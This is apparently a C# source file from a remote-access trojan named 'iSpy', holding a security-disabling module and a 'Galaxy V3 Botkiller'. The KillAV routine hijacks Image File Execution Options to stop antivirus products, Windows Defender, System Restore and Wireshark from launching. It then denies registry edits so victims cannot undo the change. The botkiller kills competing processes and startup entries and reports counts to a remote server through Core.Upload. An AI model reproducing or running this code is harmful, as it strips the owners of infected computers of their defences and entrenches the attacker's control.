using System;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.AccessControl;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Security.Principal;

/*
        This handles AV killing as well. Didn't want to make another file.
        */


namespace iSpy
{
    class KillAV
    {
        public static void Kill()
        {
            if (Core.IsAdmin())
            {
                FuckFileName("rstrui.exe");
                FuckFileName("AvastSvc.exe");
                FuckFileName("avconfig.exe");
                FuckFileName("AvastUI.exe");
                FuckFileName("avscan.exe");
                FuckFileName("instup.exe");
                FuckFileName("mbam.exe");
                FuckFileName("mbamgui.exe");
                FuckFileName("mbampt.exe");
                FuckFileName("mbamscheduler.exe");
                FuckFileName("mbamservice.exe");
                FuckFileName("hijackthis.exe");
                FuckFileName("spybotsd.exe");
                FuckFileName("ccuac.exe");
                FuckFileName("avcenter.exe");
                FuckFileName("avguard.exe");
                FuckFileName("avgnt.exe");
                FuckFileName("avgui.exe");
                FuckFileName("avgcsrvx.exe");
                FuckFileName("avgidsagent.exe");
                FuckFileName("avgrsx.exe");
                FuckFileName("avgwdsvc.exe");
                FuckFileName("egui.exe");
                FuckFileName("zlclient.exe");
                FuckFileName("bdagent.exe");
                FuckFileName("keyscrambler.exe");
                FuckFileName("avp.exe");
                FuckFileName("wireshark.exe");
                FuckFileName("ComboFix.exe");
                FuckFileName("MSASCui.exe");
                FuckFileName("MpCmdRun.exe");
                FuckFileName("msseces.exe");
                FuckFileName("MsMpEng.exe");
            }
        }
        public static void FuckFileName(string input)
        {
            try { 
                RegistryKey regKey = default(RegistryKey);
                regKey = Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true);
                regKey.CreateSubKey(input);
                regKey.Close();
                RegistryKey Fuckyou = default(RegistryKey);
                Fuckyou = Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + input, true);
                Fuckyou.SetValue("Debugger", "rundll32.exe");

                SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                NTAccount ntaccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
                RegistrySecurity registrySecurity = new RegistrySecurity();
                registrySecurity.AddAccessRule(new RegistryAccessRule(ntaccount, RegistryRights.QueryValues | RegistryRights.EnumerateSubKeys | RegistryRights.Notify | RegistryRights.ReadPermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
                registrySecurity.AddAccessRule(new RegistryAccessRule(ntaccount, RegistryRights.SetValue | RegistryRights.Delete | RegistryRights.CreateSubKey | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
                Fuckyou.SetAccessControl(registrySecurity);
                Fuckyou.Close();
            }
            catch
            {
            }
        }
    }
    class Botkiller
    {
        
        static int KilledProcesses = 0;
        static int KilledStartups = 0;

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        private static extern IntPtr IsWindowVisible(IntPtr hWnd);
        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hHandle);
        [DllImport("user32.dll")]
        private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, UInt32 dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool TerminateThread(IntPtr hThread, UInt32 dwExitCode);
        [DllImport("user32.dll")]
        public static extern int SuspendThread(IntPtr hThread);



        public static void Initialize()
        {
        }

        public static void RunStandardBotKiller()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            process.StartInfo = startInfo;
            startInfo.Arguments = "/C TASKKILL /F /IM wscript.exe";
            process.Start();
            startInfo.Arguments = "/C TASKKILL /F /IM cmd.exe";
            process.Start();
            
            RunStartupKiller();
            ScanProcess();
            string toUpload = Environment.NewLine + "Startup Items Killed: " + KilledStartups.ToString() + Environment.NewLine + "Processes Killed: " + KilledProcesses.ToString();
            Core.Upload("Galaxy V3 Botkiller", toUpload, "8");
            KilledProcesses = 0;
            KilledStartups = 0;
        }
        public static void ScanProcess()
        {
            try
            {
                Process[] Procs = Process.GetProcesses();

                string FullPath = null;
                foreach (Process Proc in Procs)
                {
                    try
                    {
                        FullPath = System.IO.Path.GetFullPath(Proc.MainModule.FileName);
                        if (IsFileMalicious(FullPath) && !Proc.Equals(Process.GetCurrentProcess()))
                        {
                            if (!WindowIsVisible(Proc.MainWindowTitle))
                            {
                                TerminateProcess(Proc.Id);
                                KillFile(FullPath);
                                KilledProcesses += 1;

                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
        }
        public static bool IsFileMalicious(string fileloc)
        {
            try
            {
                if (fileloc.Contains(Application.ExecutablePath))
                {
                    return false;
                }
                if (fileloc.Contains(Application.StartupPath))
                {
                    return false;
                }
                if (fileloc.Contains("cmd"))
                {
                    return true;
                }
                if (fileloc.Contains("wscript"))
                {
                    return true;
                }
                if (AuthenticodeTools.IsTrusted(fileloc) == true)
                {
                    return false;
                }
                if ((fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))))
                {
                    return true;
                }
                FileAttributes attributes = default(FileAttributes);
                attributes = File.GetAttributes(fileloc);
                if ((attributes & FileAttributes.System) == FileAttributes.System)
                {
                    return true;
                }
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
            return false;
        }
        public static void AllowAccess(string location)
        {
            try
            {
                string FolderPath = location;
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(FolderPath);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, true);
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch
            {
            }
        }
        public static void KillFile(string location)
        {
            try
            {
                string FolderPath = location;
                Random r = new Random();
                System.IO.File.Move(location, r.Next(1000, 9000) + ".tmp"); 
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(FolderPath);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(true, false);
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch
            {
            }
        }
        public static bool WindowIsVisible(string WinTitle)
        {
            try
            {
                IntPtr lHandle = FindWindow(null, WinTitle);
                return (IsWindowVisible(lHandle) != null);
            }
            catch
            {
                return false;
            }
        }
        public static void DestroyLoop(string sDir, ref List<string> list)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {

                }
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    DestroyLoop(d, ref list);
                }
            }
            catch
            {

            }
        }

        public static void RunStartupKiller()
        {
            BotkillStartup("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 1);
            BotkillStartup("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 1);
            if (Core.IsAdmin())
            {
                BotkillStartup("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 2);
                BotkillStartup("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 2);
            }
            List<String> files = new List<String>();
            string sDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            DestroyLoop(sDir, ref files);
        }
        public static void BotkillStartup(string Path, int Type)
        {
            RegistryKey entry;
            string Buffer;
            if(Type == 1)
            {
                entry = Registry.CurrentUser.OpenSubKey(Path);
            } else
            {
                entry = Registry.LocalMachine.OpenSubKey(Path);
            }
            try

            {

            
            foreach (string subEntry in entry.GetValueNames())
            {
                Buffer = subEntry;
                if (Buffer.Contains("\""))
                {
                    Buffer = subEntry.Replace("\"", "");
                }
                Buffer = System.IO.Path.GetFullPath(Path);
                if(IsFileMalicious(Buffer))
                {
                        TerminateProcessPath(Buffer);
                        KillFile(Buffer);
                                                
                }
            }
            } catch
            {
                
            }
        }


        public static void RemoveKey(int Reg, string file, string reglocation, string FileLocation)
        {
            try
            {
                string name = reglocation;
                RegistryKey key = null;

                if (Reg == 1)
                {
                    key = Registry.CurrentUser.OpenSubKey(name, true);

                }
                else
                {
                    key = Registry.LocalMachine.OpenSubKey(name, true);

                }
                using (key)
                {
                    if (((key != null)))
                    {
                        key.DeleteValue(file);
                        //    DeletedKeys = DeletedKeys + 1
                    }
                }
            }
            catch
            {
            }
        }
        public static void TerminateProcessPath(string Path)
        {
            try
            {
                if (!Path.Contains(Application.StartupPath))
                {
                    /*if (Path.Contains("\\")) {
                            string[] killit = Path.Split('\\');
                            string tkillit = killit[killit.Length - 1];
                        foreach (string xd in lol) {
                            if (xd.Contains(".exe"))
                                Path = xd;
                        }*/
                    Path = System.IO.Path.GetFileNameWithoutExtension(Path);
                    Process[] Procz = Process.GetProcesses();
                    foreach (Process Procs in Procz)
                    {
                        if (Procs.ProcessName.Contains(Path))
                        {
                            TerminateProcess(Procs.Id);
                        }
                    }
                }
            }
            catch
            {
            }
        }
        public static void TerminateProcess(int PID)
        {
            try
            {
                Process processById = Process.GetProcessById(PID);
                if ((processById.ProcessName != string.Empty))
                {
                    processById.Kill();
                }
            }
            catch
            {
            }
        }

        public enum ThreadAccess
        {
            // Fields
            DIRECT_IMPERSONATION = 0x200,
            GET_CONTEXT = 8,
            IMPERSONATE = 0x100,
            QUERY_INFORMATION = 0x40,
            SET_CONTEXT = 0x10,
            SET_INFORMATION = 0x20,
            SET_THREAD_TOKEN = 0x80,
            SUSPEND_RESUME = 2,
            TERMINATE = 1
        }
        #region "WinTrustData struct field enums"
        public enum WinTrustDataUIChoice : uint
        {
            All = 1,
            None = 2,
            NoBad = 3,
            NoGood = 4
        }
        public enum WinTrustDataRevocationChecks : uint
        {
            None = 0x0,
            WholeChain = 0x1
        }
        public enum WinTrustDataChoice : uint
        {
            File = 1,
            Catalog = 2,
            Blob = 3,
            Signer = 4,
            Certificate = 5
        }
        public enum WinTrustDataStateAction : uint
        {
            Ignore = 0x0,
            Verify = 0x1,
            Close = 0x2,
            AutoCache = 0x3,
            AutoCacheFlush = 0x4
        }
        [FlagsAttribute()]
        public enum WinTrustDataProvFlags : uint
        {
            UseIe4TrustFlag = 0x1,
            NoIe4ChainFlag = 0x2,
            NoPolicyUsageFlag = 0x4,
            RevocationCheckNone = 0x10,
            RevocationCheckEndCert = 0x20,
            RevocationCheckChain = 0x40,
            RevocationCheckChainExcludeRoot = 0x80,
            SaferFlag = 0x100,
            HashOnlyFlag = 0x200,
            UseDefaultOsverCheck = 0x400,
            LifetimeSigningFlag = 0x800,
            CacheOnlyUrlRetrieval = 0x1000
        }
        // affects CRL retrieval and AIA retrieval
        public enum WinTrustDataUIContext : uint
        {
            Execute = 0,
            Install = 1
        }
        #endregion
        #region "WinTrust structures"
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public class WinTrustFileInfo
        {
            private int StructSize = (int)Marshal.SizeOf(typeof(WinTrustFileInfo));
            private IntPtr pszFilePath;
            // required, file name to be verified
            private IntPtr hFile = IntPtr.Zero;
            // optional, open handle to FilePath
            private IntPtr pgKnownSubject = IntPtr.Zero;
            // optional, subject type if it is known
            public WinTrustFileInfo(string _filePath)
            {
                pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath);
            }
            ~WinTrustFileInfo()
            {
                Marshal.FreeCoTaskMem(pszFilePath);
            }
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public class WinTrustData
        {
            private int StructSize = (int)Marshal.SizeOf(typeof(WinTrustData));
            private IntPtr PolicyCallbackData = IntPtr.Zero;
            private IntPtr SIPClientData = IntPtr.Zero;
            // required: UI choice
            private WinTrustDataUIChoice UIChoice = WinTrustDataUIChoice.None;
            // required: certificate revocation check options
            private WinTrustDataRevocationChecks RevocationChecks = WinTrustDataRevocationChecks.None;
            // required: which structure is being passed in?
            private WinTrustDataChoice UnionChoice = WinTrustDataChoice.File;
            // individual file
            private IntPtr FileInfoPtr;
            private WinTrustDataStateAction StateAction = WinTrustDataStateAction.Ignore;
            private IntPtr StateData = IntPtr.Zero;
            private string URLReference = null;
            private WinTrustDataProvFlags ProvFlags = WinTrustDataProvFlags.SaferFlag;
            private WinTrustDataUIContext UIContext = WinTrustDataUIContext.Execute;
            // constructor for silent WinTrustDataChoice.File check
            public WinTrustData(string _fileName)
            {
                WinTrustFileInfo wtfiData = new WinTrustFileInfo(_fileName);
                FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(WinTrustFileInfo)));
                Marshal.StructureToPtr(wtfiData, FileInfoPtr, false);
            }
            ~WinTrustData()
            {
                Marshal.FreeCoTaskMem(FileInfoPtr);
            }
        }
        #endregion
    }
    internal static class AuthenticodeTools
    {
        [DllImport("Wintrust.dll", PreserveSig = true, SetLastError = false)]
        private static extern uint WinVerifyTrust(IntPtr hWnd, IntPtr pgActionID, IntPtr pWinTrustData);
        private static uint WinVerifyTrust(string fileName)
        {

            Guid wintrust_action_generic_verify_v2 = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");
            uint result = 0;
            using (WINTRUST_FILE_INFO fileInfo = new WINTRUST_FILE_INFO(fileName,
                                                                        Guid.Empty))
            using (UnmanagedPointer guidPtr = new UnmanagedPointer(Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Guid))),
                                                                   AllocMethod.HGlobal))
            using (UnmanagedPointer wvtDataPtr = new UnmanagedPointer(Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WINTRUST_DATA))),
                                                                      AllocMethod.HGlobal))
            {
                WINTRUST_DATA data = new WINTRUST_DATA(fileInfo);
                IntPtr pGuid = guidPtr;
                IntPtr pData = wvtDataPtr;
                Marshal.StructureToPtr(wintrust_action_generic_verify_v2,
                                       pGuid,
                                       true);
                Marshal.StructureToPtr(data,
                                       pData,
                                       true);
                result = WinVerifyTrust(IntPtr.Zero,
                                        pGuid,
                                        pData);

            }
            return result;

        }
        public static bool IsTrusted(string fileName)
        {
            return WinVerifyTrust(fileName) == 0;
        }


    }

    internal struct WINTRUST_FILE_INFO : IDisposable
    {

        public WINTRUST_FILE_INFO(string fileName, Guid subject)
        {

            cbStruct = (uint)Marshal.SizeOf(typeof(WINTRUST_FILE_INFO));

            pcwszFilePath = fileName;



            if (subject != Guid.Empty)
            {

                pgKnownSubject = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Guid)));

                Marshal.StructureToPtr(subject, pgKnownSubject, true);

            }

            else
            {

                pgKnownSubject = IntPtr.Zero;

            }

            hFile = IntPtr.Zero;

        }

        public uint cbStruct;

        [MarshalAs(UnmanagedType.LPTStr)]

        public string pcwszFilePath;

        public IntPtr hFile;

        public IntPtr pgKnownSubject;



        #region IDisposable Members



        public void Dispose()
        {

            Dispose(true);

        }



        private void Dispose(bool disposing)
        {

            if (pgKnownSubject != IntPtr.Zero)
            {

                Marshal.DestroyStructure(this.pgKnownSubject, typeof(Guid));

                Marshal.FreeHGlobal(this.pgKnownSubject);

            }

        }



        #endregion

    }

    enum AllocMethod
    {
        HGlobal,
        CoTaskMem
    };
    enum UnionChoice
    {
        File = 1,
        Catalog,
        Blob,
        Signer,
        Cert
    };
    enum UiChoice
    {
        All = 1,
        NoUI,
        NoBad,
        NoGood
    };
    enum RevocationCheckFlags
    {
        None = 0,
        WholeChain
    };
    enum StateAction
    {
        Ignore = 0,
        Verify,
        Close,
        AutoCache,
        AutoCacheFlush
    };
    enum TrustProviderFlags
    {
        UseIE4Trust = 1,
        NoIE4Chain = 2,
        NoPolicyUsage = 4,
        RevocationCheckNone = 16,
        RevocationCheckEndCert = 32,
        RevocationCheckChain = 64,
        RecovationCheckChainExcludeRoot = 128,
        Safer = 256,
        HashOnly = 512,
        UseDefaultOSVerCheck = 1024,
        LifetimeSigning = 2048
    };
    enum UIContext
    {
        Execute = 0,
        Install
    };

    [StructLayout(LayoutKind.Sequential)]

    internal struct WINTRUST_DATA : IDisposable
    {

        public WINTRUST_DATA(WINTRUST_FILE_INFO fileInfo)
        {

            this.cbStruct = (uint)Marshal.SizeOf(typeof(WINTRUST_DATA));

            pInfoStruct = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WINTRUST_FILE_INFO)));

            Marshal.StructureToPtr(fileInfo, pInfoStruct, false);

            this.dwUnionChoice = UnionChoice.File;



            pPolicyCallbackData = IntPtr.Zero;

            pSIPCallbackData = IntPtr.Zero;



            dwUIChoice = UiChoice.NoUI;

            fdwRevocationChecks = RevocationCheckFlags.None;

            dwStateAction = StateAction.Ignore;

            hWVTStateData = IntPtr.Zero;

            pwszURLReference = IntPtr.Zero;

            dwProvFlags = TrustProviderFlags.Safer;



            dwUIContext = UIContext.Execute;

        }



        public uint cbStruct;

        public IntPtr pPolicyCallbackData;

        public IntPtr pSIPCallbackData;

        public UiChoice dwUIChoice;

        public RevocationCheckFlags fdwRevocationChecks;

        public UnionChoice dwUnionChoice;

        public IntPtr pInfoStruct;

        public StateAction dwStateAction;

        public IntPtr hWVTStateData;

        private IntPtr pwszURLReference;

        public TrustProviderFlags dwProvFlags;

        public UIContext dwUIContext;



        #region IDisposable Members



        public void Dispose()
        {

            Dispose(true);

        }



        private void Dispose(bool disposing)
        {

            if (dwUnionChoice == UnionChoice.File)
            {

                WINTRUST_FILE_INFO info = new WINTRUST_FILE_INFO();

                Marshal.PtrToStructure(pInfoStruct, info);

                info.Dispose();

                Marshal.DestroyStructure(pInfoStruct, typeof(WINTRUST_FILE_INFO));

            }



            Marshal.FreeHGlobal(pInfoStruct);

        }



        #endregion

    }

    internal sealed class UnmanagedPointer : IDisposable
    {

        private IntPtr m_ptr;

        private AllocMethod m_meth;

        internal UnmanagedPointer(IntPtr ptr, AllocMethod method)
        {

            m_meth = method;

            m_ptr = ptr;

        }



        ~UnmanagedPointer()
        {

            Dispose(false);

        }



        #region IDisposable Members

        private void Dispose(bool disposing)
        {

            if (m_ptr != IntPtr.Zero)
            {

                if (m_meth == AllocMethod.HGlobal)
                {

                    Marshal.FreeHGlobal(m_ptr);

                }

                else if (m_meth == AllocMethod.CoTaskMem)
                {

                    Marshal.FreeCoTaskMem(m_ptr);

                }

                m_ptr = IntPtr.Zero;

            }



            if (disposing)
            {

                GC.SuppressFinalize(this);

            }

        }



        public void Dispose()
        {

            Dispose(true);

        }



        #endregion



        public static implicit operator IntPtr(UnmanagedPointer ptr)
        {

            return ptr.m_ptr;

        }

    }
}
